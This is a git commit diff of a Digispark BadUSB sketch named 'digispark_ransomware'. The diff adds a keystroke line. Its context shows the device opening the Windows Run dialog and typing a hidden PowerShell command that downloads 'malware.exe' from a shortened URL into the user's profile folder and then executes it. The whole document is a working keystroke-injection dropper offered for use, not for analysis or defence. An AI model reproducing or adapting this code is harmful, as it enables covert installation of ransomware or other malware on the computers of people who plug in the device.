468b0e5d444d9a43b2a3ca39152a235b56e72b39
Pinokkio <112076418+miljonka@users.noreply.github.com>
2023-12-07 10:56:19 +0200

    Update digispark_ransomware.ino

--- digispark/digispark_ransomware/digispark_ransomware.ino
+++ digispark/digispark_ransomware/digispark_ransomware.ino
@@ -4,6 +4,7 @@ void setup() {}
 
 void loop() {
   DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
   DigiKeyboardFi.print("powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/28sb6pvc', \\\"$env:UserProfile/TestDirz338/malware.exe\\\");Start-Process \\\"$env:UserProfile/TestDirz338/malware.exe\\\" -WorkingDir \\\"$env:UserProfile/TestDirz338\\\"\"");
